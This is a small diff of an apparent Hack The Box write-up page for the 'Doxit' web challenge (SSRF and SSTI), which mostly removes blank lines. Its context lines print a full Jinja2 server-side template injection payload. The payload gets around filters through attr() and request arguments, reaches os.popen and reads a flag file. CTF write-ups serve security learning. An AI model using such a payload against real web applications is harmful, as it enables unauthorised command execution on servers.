@@ -3,7 +3,6 @@ layout: page
 description: "SSRF - SSTI"
 title: "[WEB] HTB Challange - Doxit"
 ---
-
 # Doxit
 
 This is a web challenge based on 2 services, one exposed and one running in local.
@@ -112,5 +111,3 @@ Cat flag
 
 directory={%with%20a=((((request|attr('application'))|attr(request|attr('args')|attr('get')('globals')))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('builtins'))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('import'))('os')|attr('popen')(request|attr('args')|attr('get')('cmd'))|attr('read')()%}{%print(a)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=cat%20/flag960bbeb43c.txt
 ```
-
-:)
